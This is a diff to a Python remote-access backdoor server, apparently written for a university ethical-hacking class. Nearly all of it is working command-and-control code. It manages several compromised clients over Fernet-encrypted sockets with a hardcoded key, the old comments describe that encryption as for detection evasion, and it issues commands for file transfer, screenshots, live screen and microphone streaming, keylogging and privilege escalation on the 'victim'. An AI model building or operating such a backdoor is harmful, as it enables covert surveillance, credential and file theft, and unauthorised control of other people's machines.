@@ -1,226 +1,328 @@
+#!/usr/bin/env python3
 #################################################################################################
 # Authors: Korn D., Krittanut Y., Sirapat T., Sarun P., Norraset S., Thanapat S., Siwanon T.    #
-# Class: SIIT Ethical Hacking, 2023-2024                                                        #
+# Class: SIIT Ethical Hacking, 2023-2024                                                      #
 #################################################################################################
 
-# Import necessary libraries
 import base64
-import datetime  # For timestamping
-import socket  # This library is used for creating socket connections.
-import json  # JSON is used for encoding and decoding data in a structured format.
-import os  # This library allows interaction with the operating system.
+import datetime
+import socket
+import json
+import os
 import ctypes
 from ctypes import c_char_p, c_int, CFUNCTYPE
-import pyaudio
+#import pyaudio
 import threading
-from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
-import cv2 # (OpenCV) shows the image in a live window.
-import numpy as np # helps decode the raw JPEG bytes into an image array.
-import threading
+import time
+from cryptography.fernet import Fernet
+import cv2
+import numpy as np
 
+# ANSI color codes for improved UX
+RED = "\033[91m"
+GREEN = "\033[92m"
+YELLOW = "\033[93m"
+BLUE = "\033[94m"
+CYAN = "\033[96m"
+BOLD = "\033[1m"
+RESET = "\033[0m"
 
 # Pre-shared key for encryption
-psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
-cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption
+psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI='
+cipher = Fernet(psk_aes)
+
+# Global variables for multi-client support
+clients = {}
+client_counter = 0
+selected_client = None
 
 
-# Function to send data in a reliable way (encoded as JSON)
-def reliable_send(data):
-    jsondata = json.dumps(data)  # Convert data to JSON format
-    encrypted_data = cipher.encrypt(jsondata.encode())  # Encrypt the JSON data *added*
-    data_len = len(encrypted_data)
-    target.sendall(data_len.to_bytes(4, 'big'))  # Send 4-byte length prefix
-    target.sendall(encrypted_data)
+def reliable_send(data, target_socket):
+    try:
+        jsondata = json.dumps(data)
+        encrypted = cipher.encrypt(jsondata.encode())
+        length = len(encrypted)
+        target_socket.sendall(length.to_bytes(4, 'big'))
+        target_socket.sendall(encrypted)
+        return True
+    except Exception:
+        return False
 
 
-
-# Function to receive data in a reliable way (expects JSON data)
-def reliable_recv():
-    data_len_bytes = target.recv(4)
-    if not data_len_bytes:
-        return None
-    data_len = int.from_bytes(data_len_bytes, 'big')
-    data = b''
-    while len(data) < data_len:
-        packet = target.recv(data_len - len(data))
-        if not packet:
+def reliable_recv(target_socket):
+    try:
+        length_bytes = target_socket.recv(4)
+        if not length_bytes:
             return None
-        data += packet
-    decrypted_data = cipher.decrypt(data)
-    return json.loads(decrypted_data.decode())
+        length = int.from_bytes(length_bytes, 'big')
+        payload = b''
+        while len(payload) < length:
+            chunk = target_socket.recv(length - len(payload))
+            if not chunk:
+                return None
+            payload += chunk
+        decrypted = cipher.decrypt(payload)
+        return json.loads(decrypted.decode())
+    except Exception:
+        return None
 
 
-# Function to upload a file to the target machine
-def upload_file(file_name):
-    # Open the specified file in binary read ('rb') mode.
-    f = open(file_name, 'rb')
-    # Read the contents of the file and send them over the network connection to the target.
-    target.send(f.read())
+def list_clients():
+    if not clients:
+        print(f"{RED}[-] No active connections{RESET}")
+        return
+    print(f"\n{BOLD}{CYAN}╔═══════════════════════════════════════════════════════╗{RESET}")
+    print(f"{BOLD}{CYAN}║                   ACTIVE CLIENTS                     ║{RESET}")
+    print(f"{CYAN}╠═══════════════════════════════════════════════════════╣{RESET}")
+    print(f"{CYAN}║ {'ID':<4}│ {'TYPE':<12}│ {'IP ADDRESS':<18}│ {'STATUS':<10} ║{RESET}")
+    print(f"{CYAN}╠═══════════════════════════════════════════════════════╣{RESET}")
+    for cid, info in clients.items():
+        status = f"{GREEN}Connected{RESET}" if info['connected'] else f"{RED}Disconnected{RESET}"
+        print(f"{CYAN}║ {BOLD}{cid:<4}{RESET}{CYAN}│ {info['type']:<12}│ {info['address'][0]:<18}│ {status:<18} ║{RESET}")
+    print(f"{CYAN}╚═══════════════════════════════════════════════════════╝{RESET}")
 
 
-# Function to download a file from the target machine
-def download_file(file_name):
-    # Open the specified file in binary write ('wb') mode.
-    f = open(file_name, 'wb')
-    # Set a timeout for receiving data from the target (1 second).
-    target.settimeout(1)
-    chunk = target.recv(1024)
-    while chunk:
-        # Write the received data (chunk) to the local file.
-        f.write(chunk)
-        try:
-            # Attempt to receive another chunk of data from the target.
-            chunk = target.recv(1024)
-        except socket.timeout as e:
-            break
-    # Reset the timeout to its default value (None).
-    target.settimeout(None)
-    # Close the local file after downloading is complete.
-    f.close()
+def handle_client(client_socket, client_address, client_id):
+    shell_type = "Admin" if client_id > 1 else "User"
+    print(f"{GREEN}[+] Client {client_id} ({shell_type}) connected from {client_address[0]}{RESET}")
+    clients[client_id] = {
+        'socket': client_socket,
+        'address': client_address,
+        'type': shell_type,
+        'connected': True
+    }
+    
+    # Auto-select admin shells when they connect
+    global selected_client
+    if client_id > 1:  # Admin shell
+        selected_client = client_id
+        print(f"{GREEN}[+] Auto-selected Admin Client {client_id} for interaction{RESET}")
+    else:
+        # Show updated client list for user shells only
+        list_clients()
+    
+    try:
+        while clients[client_id]['connected']:
+            time.sleep(1)
+    except Exception as e:
+        print(f"{RED}[-] Client {client_id} error: {str(e)}{RESET}")
+    finally:
+        if client_id in clients:
+            clients[client_id]['connected'] = False
+            try:
+                client_socket.close()
+            except:
+                pass
+            del clients[client_id]
+            print(f"{YELLOW}[-] Client {client_id} session closed{RESET}")
 
-# Listens for incoming image data from the victim.
+
+def select_client():
+    global selected_client
+    list_clients()
+    try:
+        cid = int(input(f"{YELLOW}\n[*] Enter Client ID to interact:{RESET} "))
+        if cid in clients and clients[cid]['connected']:
+            selected_client = cid
+            info = clients[cid]
+            print(f"{GREEN}[+] Now interacting with Client {cid} ({info['type']}) at {info['address'][0]}{RESET}")
+            return True
+        else:
+            print(f"{RED}[!] Invalid Client ID. Use 'clients' to view active IDs.{RESET}")
+            return False
+    except ValueError:
+        print(f"{RED}[!] Please enter a valid numeric Client ID{RESET}")
+        return False
+
+
+def upload_file(file_name, target_socket):
+    try:
+        with open(file_name, 'rb') as f:
+            target_socket.send(f.read())
+        print(f"{GREEN}[+] Uploaded {file_name}{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] Upload error: {str(e)}{RESET}")
+
+
+def download_file(file_name, target_socket):
+    try:
+        with open(file_name, 'wb') as f:
+            target_socket.settimeout(1)
+            chunk = target_socket.recv(1024)
+            while chunk:
+                f.write(chunk)
+                try:
+                    chunk = target_socket.recv(1024)
+                except socket.timeout:
+                    break
+            target_socket.settimeout(None)
+        print(f"{GREEN}[+] Downloaded {file_name}{RESET}")
+    except Exception as e:
+        print(f"{RED}[-] Download error: {str(e)}{RESET}")
+
+
 def receive_screen_stream():
-    stream_sock = socket.socket() # Create a TCP socket
-    stream_sock.bind(('0.0.0.0', 9999)) # Bind it to port 9999, accept the victim’s stream connection
+    stream_sock = socket.socket()
+    stream_sock.bind(('0.0.0.0', 9999))
     stream_sock.listen(1)
     conn, addr = stream_sock.accept()
-    print(f"[+] Live screen stream from {addr}")
-
+    print(f"{GREEN}[+] Live screen stream from {addr[0]}:{addr[1]}{RESET}")
     try:
-        while True: # Start reading frames in a loop.
-            size_data = conn.recv(4) # Read the 4-byte size prefix.
-            if not size_data:
-                break
-            size = int.from_bytes(size_data, 'big') # Convert it back into an integer (JPEG image length).
+        while True:
+            size_data = conn.recv(4)
+            if not size_data: break
+            size = int.from_bytes(size_data, 'big')
             data = b''
-            while len(data) < size: # Read the full image payload based on the size prefix.
+            while len(data) < size:
                 packet = conn.recv(size - len(data))
-                if not packet:
-                    break
-                data += packet # Append until the complete image is received.
-
-            img_array = np.frombuffer(data, dtype=np.uint8) # Convert raw JPEG bytes into a numpy array
-            frame = cv2.imdecode(img_array, cv2.IMREAD_COLOR) # Decode into a color image (OpenCV format)
-            if frame is not None:
-                resized = cv2.resize(frame, (1280, 720))  # Change size of window
-                cv2.imshow("Live Screen", resized) # Display the image in a window named Live Screen
-                if cv2.waitKey(1) == ord('q'): # If the user presses q, stop the stream
+                if not packet: break
+                data += packet
+            img = cv2.imdecode(np.frombuffer(data, dtype=np.uint8), cv2.IMREAD_COLOR)
+            if img is not None:
+                resized = cv2.resize(img, (1280, 720))
+                cv2.imshow("Live Screen", resized)
+                if cv2.waitKey(1) == ord('q'):
                     break
     finally:
         conn.close()
         cv2.destroyAllWindows()
 
-
+# Suppress ALSA errors
 ERROR_HANDLER_FUNC = CFUNCTYPE(None, c_char_p, c_int, c_char_p, c_int, c_char_p)
-
-def py_error_handler(filename, line, function, err, fmt):
-    pass  # suppress all ALSA errors
-
+def py_error_handler(filename, line, function, err, fmt): pass
 c_error_handler = ERROR_HANDLER_FUNC(py_error_handler)
-
 try:
     asound = ctypes.cdll.LoadLibrary('libasound.so')
     asound.snd_lib_error_set_handler(c_error_handler)
 except OSError:
-    pass  # libasound not found, skip suppression
+    pass
 
-def stream_audio_from_target(flag):
-    CHUNK = 1024
-    FORMAT = pyaudio.paInt16
-    CHANNELS = 1
-    RATE = 11025
 
+def stream_audio_from_target(flag, target_socket):
+    CHUNK, FORMAT, CHANNELS, RATE = 1024, pyaudio.paInt16, 1, 11025
     p = pyaudio.PyAudio()
-    stream = p.open(format=FORMAT, channels=CHANNELS,
-                    rate=RATE, output=True, frames_per_buffer=CHUNK)
-
+    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, output=True, frames_per_buffer=CHUNK)
     try:
         while flag['on']:
-            data = target.recv(CHUNK)
-            if not data:
-                break
+            data = target_socket.recv(CHUNK)
+            if not data: break
             stream.write(data)
-    except:
-        pass
     finally:
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
+        stream.stop_stream(); stream.close(); p.terminate()
 
 
-# Function for the main communication loop with the target
 def target_communication():
+    global selected_client
+    HELP_TEXT = f"""
+Available Server Commands:
+  clients           List all client sessions
+  select            Choose a client to interact with
+  clear             Clear the console
+  help              Show this help message
+
+Within Client Session:
+  screenshot        Capture a screenshot from the client
+  screen_stream     View live screen stream
+  upload <file>     Upload a file to the client
+  download <file>   Download a file from the client
+  elevate           Attempt privilege escalation on client
+  listening_start   Start microphone audio stream
+  listening_stop    Stop microphone audio stream
+  keylogger_start   Begin keylogging
+  keylogger_stop    End keylogging
+  keylogger_dump    Retrieve keylogger data
+"""
     while True:
-        # Prompt the user for a command to send to the target.
-        command = input('* Shell~%s: ' % str(ip))
-        # Send the user's command to the target using the reliable_send function.
-        reliable_send(command)
-        if command == 'quit':
-            # If the user enters 'quit', exit the loop and close the connection.
-            break
-        elif command == 'clear':
-            # If the user enters 'clear', clear the terminal screen.
-            os.system('clear')
-        elif command[:3] == 'cd ':
-            # If the user enters 'cd', change the current directory on the target (not implemented).
-            pass
-        elif command[:8] == 'download':
-            # If the user enters 'download', initiate the download of a file from the target.
-            download_file(command[9:])
-        elif command[:6] == 'upload':
-            # If the user enters 'upload', initiate the upload of a file to the target.
-            upload_file(command[7:])
-        elif command == 'listening_start':
-            stream_flag = {'on': False}
-            if not stream_flag['on']:
-                stream_flag['on'] = True
-                audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag,))
-                audio_thread.daemon = True
-                audio_thread.start()
-            print("[+] Audio stream started.")
-        elif command == 'listening_stop':
-            stream_flag['on'] = False
-            audio_thread.join()  # Wait for the audio thread to finish
-            print("[+] Audio stream stopped.")
-        elif command == 'screenshot':
-            # If the user enters 'screenshot', send a command to take a screenshot on the target.
-            shot = reliable_recv()
-            image_data = base64.b64decode(shot)
-            if image_data:
-                # Format timestamp
-                timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
-                filename = f'screenshot_{timestamp}.png' # filename format
-                with open(filename, 'wb') as f:
-                    f.write(image_data)
-                # If the screenshot command is successful, print the result.
-                print('[+] Screenshot taken successfully.')
+        if not clients:
+            print(f"{YELLOW}[-] Waiting for clients...{RESET}")
+            time.sleep(2)
+            continue
+        if selected_client is None or selected_client not in clients:
+            if not select_client():
+                continue
+        info = clients[selected_client]
+        sock = info['socket']
+        prompt = f"{BOLD}{BLUE}[{info['type']} Client-{selected_client}@{info['address'][0]}]{RESET} {YELLOW}➤{RESET} "
+        cmd = input(prompt).strip()
+        if cmd == 'help':
+            print(HELP_TEXT)
+            continue
+        if cmd == 'clients':
+            list_clients()
+            selected_client = None
+            continue
+        if cmd == 'select':
+            selected_client = None
+            continue
+        if cmd == 'clear':
+            os.system('cls' if os.name=='nt' else 'clear')
+            continue
+        if not reliable_send(cmd, sock):
+            print(f"{RED}[-] Failed to send command to client{RESET}")
+            selected_client = None
+            continue
+        # Handle special commands locally
+        if cmd.startswith('download '):
+            download_file(cmd.split(' ',1)[1], sock)
+        elif cmd.startswith('upload '):
+            upload_file(cmd.split(' ',1)[1], sock)
+        elif cmd == 'listening_start':
+            flag = {'on': True}
+            threading.Thread(target=stream_audio_from_target, args=(flag, sock), daemon=True).start()
+            print(f"{GREEN}[+] Audio stream started{RESET}")
+        elif cmd == 'listening_stop':
+            flag['on'] = False
+            print(f"{GREEN}[+] Audio stream stopped{RESET}")
+        elif cmd == 'screenshot':
+            shot = reliable_recv(sock)
+            if shot:
+                try:
+                    img = base64.b64decode(shot)
+                    fname = f"screenshot_c{selected_client}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
+                    with open(fname, 'wb') as f:
+                        f.write(img)
+                    print(f"{GREEN}[+] Screenshot saved as {fname}{RESET}")
+                except Exception as e:
+                    print(f"{RED}[-] Screenshot processing error: {str(e)}{RESET}")
             else:
-                # If the screenshot command fails, print an error message.
-                print('[-] Failed to take screenshot.')
-        elif command == 'screen_stream':
+                print(f"{RED}[-] No screenshot received{RESET}")
+        elif cmd == 'screen_stream':
             threading.Thread(target=receive_screen_stream, daemon=True).start()
-            print('[*] Waiting for live stream...')  # target will send after this
-            result = reliable_recv()
-            print(result)
+            print(f"{YELLOW}[*] Awaiting live stream...{RESET}")
         else:
-            # For other commands, receive and print the result from the target.
-            result = reliable_recv()
-            print(result)
+            res = reliable_recv(sock)
+            if res:
+                print(res)
 
 
-# Create a socket for the server
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def start_server():
+    global client_counter
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    bind_ip, bind_port = '192.168.56.102', 5555
+    sock.bind((bind_ip, bind_port))
+    sock.listen(10)
+    print(f"{BOLD}{CYAN}╔═══════════════════════════════════════════════════════════════════╗{RESET}")
+    print(f"{BOLD}{CYAN}║                        ENHANCED BACKDOOR SERVER                   ║{RESET}")
+    print(f"{CYAN}╚═══════════════════════════════════════════════════════════════════╝{RESET}")
+    print(f"{GREEN}[+] Enhanced Backdoor Server Started on {bind_ip}:{bind_port}{RESET}")
+    print(f"{YELLOW}[*] Type 'help' for commands list{RESET}")
+    print(f"{CYAN}{'─' * 70}{RESET}")
+    threading.Thread(target=target_communication, daemon=True).start()
+    try:
+        while True:
+            client_sock, addr = sock.accept()
+            client_counter += 1
+            threading.Thread(
+                target=handle_client,
+                args=(client_sock, addr, client_counter),
+                daemon=True
+            ).start()
+    except KeyboardInterrupt:
+        print(f"\n{YELLOW}[!] Shutting down server...{RESET}")
+    finally:
+        sock.close()
 
-# Bind the socket to a specific IP address ('192.168.1.12') and port (5555).
-sock.bind(('192.168.210.1', 5555))
 
-# Start listening for incoming connections (maximum 5 concurrent connections).
-print('[+] Listening For The Incoming Connections')
-sock.listen(5)
-
-# Accept incoming connection from the target and obtain the target's IP address.
-target, ip = sock.accept()
-print('[+] Target Connected From: ' + str(ip))
-
-# Start the main communication loop with the target by calling target_communication.
-target_communication()
+if __name__ == '__main__':
+    start_server()
